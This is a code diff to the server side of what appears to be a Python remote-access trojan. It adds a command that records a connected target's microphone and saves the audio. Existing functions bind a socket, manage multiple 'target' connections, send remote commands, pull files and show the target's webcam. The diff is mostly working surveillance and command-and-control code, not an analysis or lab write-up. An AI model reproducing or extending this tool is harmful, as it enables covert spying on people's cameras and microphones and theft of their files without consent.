@@ -2,8 +2,10 @@
 from __future__ import print_function
 import cv2
 import time
+import wave
 import numpy
 import socket
+import pyaudio
 import threading
 from Queue import Queue
 
@@ -36,6 +38,7 @@ COMMANDS = {'help': ['Shows this help'],
 def print_help():
     """
     The function prints all the commands we can use and what they do
+
     :return: None
     """
     for cmd, explanation in sorted(COMMANDS.iteritems()):
@@ -45,6 +48,7 @@ def print_help():
 def socket_create():
     """
     The function creates socket (allows two computers to connect)
+
     :return: None
     """
     try:
@@ -61,6 +65,7 @@ def socket_create():
 def socket_bind():
     """
     The function binds socket to port and wait for connection from client
+
     :return: None
     """
     try:
@@ -79,6 +84,7 @@ def socket_bind():
 def accept_connections():
     """
     The function accepts connections from multiple clients and save to list
+
     :return: None
     """
     for connection in all_connections:
@@ -99,6 +105,7 @@ def accept_connections():
 def start_turtle():
     """
     The function shows an interactive prompt for sending commands remotely
+
     :return: None
     """
     while True:
@@ -139,8 +146,10 @@ def list_connections():
 def get_target(cmd):
     """
     The function helps the server select a client
+
     :param cmd: The command we are trying to execute
     :type cmd: str
+
     :return: A IP address of a client to connect to
     :rtype: str
     """
@@ -159,9 +168,12 @@ def get_target(cmd):
 def get_file(command, conn):
     """
     The function receives a file from the target computer
+
     :param command: The command with the file name
     :type command: str
+
     :param conn: The connection to the target computer
+
     :return: None
     """
     f = open(str(command[9:]), 'wb')
@@ -192,7 +204,9 @@ def get_camera(conn):
     """
     The function gets an image from the client through the socket
     and shows it on the screen
+
     :param conn: a connection
+
     :return: None
     """
     frame_data = conn.recv(4000000)
@@ -204,10 +218,56 @@ def get_camera(conn):
         cv2.destroyAllWindows()
 
 
+def get_audio(conn):
+    chunk = 1024
+    audio_format = pyaudio.paInt16
+    channels = 1
+    rate = 44100
+    record_seconds = 4
+    wave_output_filename = "server_output.wav"
+    width = 2
+    frames = []
+
+    p = pyaudio.PyAudio()
+    stream = p.open(format=p.get_format_from_width(width),
+                    channels=channels,
+                    rate=rate,
+                    output=True,
+                    frames_per_buffer=chunk)
+
+    data = conn.recv(1024)
+    i = 1
+    while data != '':
+        if str(data).__contains__('The file was sent'):
+            stream.write(data[:str(data).find('The file was sent')])
+            frames.append(data[:str(data).find('The file was sent')])
+            break
+        stream.write(data)
+        data = conn.recv(1024)
+        i = i + 1
+        print(i)
+        frames.append(data)
+
+    wf = wave.open(wave_output_filename, 'wb')
+    wf.setnchannels(channels)
+    wf.setsampwidth(p.get_sample_size(audio_format))
+    wf.setframerate(rate)
+    wf.writeframes(b''.join(frames))
+    wf.close()
+
+    stream.stop_stream()
+    stream.close()
+    p.terminate()
+    print("Done Receiving")
+    print(str(data[str(data).find('The file was '
+                                  'sent'):]), end="")
+
+
 def send_target_commands(conn):
     """
     The function connects to a target client and executes commands
     :param conn: a connection
+
     :return: None
     """
     while True:
@@ -221,6 +281,10 @@ def send_target_commands(conn):
                 elif cmd.__contains__('show camera'):
                     conn.send(str.encode(cmd))
                     get_camera(conn)
+                    continue
+                elif cmd.__contains__('record audio'):
+                    conn.send(str.encode(cmd))
+                    get_audio(conn)
                     continue
                 else:
                     conn.send(str.encode(cmd))
@@ -236,6 +300,7 @@ def send_target_commands(conn):
 def create_workers():
     """
     The function creates the threads (Workers)
+
     :return: None
     """
     for _ in range(NUMBER_OF_THREADS):
@@ -248,6 +313,7 @@ def work():
     """
     The function does the next job in the queue (one handles connections,
     the other sends commands)
+
     :return: None
     """
     while True:
@@ -264,6 +330,7 @@ def work():
 def create_jobs():
     """
     The function defines each item on the list as a new job
+
     :return: None
     """
     for x in JOB_NUMBER:
